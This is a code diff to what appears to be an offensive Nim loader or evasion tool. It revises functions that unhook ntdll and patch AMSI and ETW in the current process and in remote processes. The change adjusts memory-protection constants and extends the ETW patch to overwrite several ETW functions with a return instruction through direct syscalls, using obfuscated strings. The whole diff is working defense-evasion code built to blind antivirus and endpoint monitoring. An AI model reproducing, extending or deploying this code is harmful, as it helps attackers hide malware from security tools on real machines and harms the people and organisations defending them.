@@ -192,7 +192,7 @@ proc ntdllunhook(): bool =
             syscall = ntProtectTable.wSysCall
           else:
             echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
+          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x04, &oldProtection)
           if status != 0:
             echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
@@ -416,7 +416,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
     if getSyscall(ntProtectTable):
                 
         syscall = ntProtectTable.wSysCall
-        status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+        status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to allocate memory.")
@@ -654,7 +654,7 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
     if getSyscall(ntProtectTable):
                 
         syscall = ntProtectTable.wSysCall
-        status = NtProtectVirtualMemory(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+        status = NtProtectVirtualMemory(hProcess, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to allocate memory.")
@@ -765,7 +765,7 @@ proc PatchAmsi(): bool =
     if getSyscall(ntProtectTable):
                 
         syscall = ntProtectTable.wSysCall
-        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to change memory protections.")
@@ -824,6 +824,7 @@ proc Patchntdll(): bool =
         op: ULONG
         t: ULONG
         disabled: bool = false
+        PatchAPIs: seq[string] = @[obf("EtwNotificationRegister"), obf("EtwEventRegister"), obf("EtwEventWriteFull"), obf("EtwEventWrite")]
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
@@ -836,74 +837,76 @@ proc Patchntdll(): bool =
     if (ntdll == 0):
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
+    
+    for singleAPI in PatchAPIs:
+        echo obf("Patching : "),singleAPI
+        when defined(DInvoke):
+            cs = MyGetProcAddress(ntdll,singleAPI)
+        else:
+            cs = GetProcAddress(ntdll, singleAPI)
+        if isNil(cs):
+            echo obf("[X] Failed to get the address of "), singleAPI
+            return disabled
 
-    when defined(DInvoke):
-        cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
-    else:
-        cs = GetProcAddress(ntdll, obf("EtwEventWrite"))
-    if isNil(cs):
-        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
-        return disabled
+        var oldProtection: DWORD = 0
 
-    var oldProtection: DWORD = 0
+        var success: BOOL
+        var protectAddress = cs
+        var friendlycodeLength = cast[SIZE_T](patch.len)
 
-    var success: BOOL
-    var protectAddress = cs
-    var friendlycodeLength = cast[SIZE_T](patch.len)
-
-    let tProcess = GetCurrentProcessId()
-    when defined(DInvoke):
-        var pHandle: HANDLE = MyGetCurrentProcess()
-    else:
-        var pHandle: HANDLE = GetCurrentProcess()
+        let tProcess = GetCurrentProcessId()
+        when defined(DInvoke):
+            var pHandle: HANDLE = MyGetCurrentProcess()
+        else:
+            var pHandle: HANDLE = GetCurrentProcess()
         
-    var 
-        status          : NTSTATUS          = 0x00000000
-        buffer          : LPVOID
+        var 
+            status          : NTSTATUS          = 0x00000000
+            buffer          : LPVOID
 
 
-    if getSyscall(ntProtectTable):
+        if getSyscall(ntProtectTable):
                 
-        syscall = ntProtectTable.wSysCall
-        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+            syscall = ntProtectTable.wSysCall
+            status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
-        if not NT_SUCCESS(status):
-            echo obf("[-] Failed to change memory protections.")
+            if not NT_SUCCESS(status):
+                echo obf("[-] Failed to change memory protections.")
+            else:
+                echo obf("[*] Applying Syscall ETW patch")
         else:
-            echo obf("[*] Applying Syscall ETW patch")
-    else:
-        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
-    var 
-        bytesWritten: SIZE_T
+        var 
+            bytesWritten: SIZE_T
 
-    if getSyscall(ntWriteTable):
+        if getSyscall(ntWriteTable):
 
-        syscall = ntWriteTable.wSysCall
-        var outLength: SIZE_T
-        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+            syscall = ntWriteTable.wSysCall
+            var outLength: SIZE_T
+            status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
 
-        if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
-        else:
-            echo obf("[+] NtWriteVirtualMemory Succeed!")
+            if not NT_SUCCESS(status):
+                echo obf("[-] Failed to write memory.")
+            else:
+                echo obf("[+] NtWriteVirtualMemory Succeed!")
                 
                
-    else:
-        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-
-    if getSyscall(ntProtectTable):
-                
-        syscall = ntProtectTable.wSysCall
-        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
-                
-        if not NT_SUCCESS(status):
-            echo obf("[-] Failed to change memory protections.")
         else:
-            echo obf("[+] OldProtect set back")
-            disabled = true
-    else:
-        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+        if getSyscall(ntProtectTable):
+                
+            syscall = ntProtectTable.wSysCall
+            status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                
+            if not NT_SUCCESS(status):
+                echo obf("[-] Failed to change memory protections.")
+            else:
+                echo obf("[+] OldProtect set back")
+                disabled = true
+        else:
+            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
     
     return disabled
 
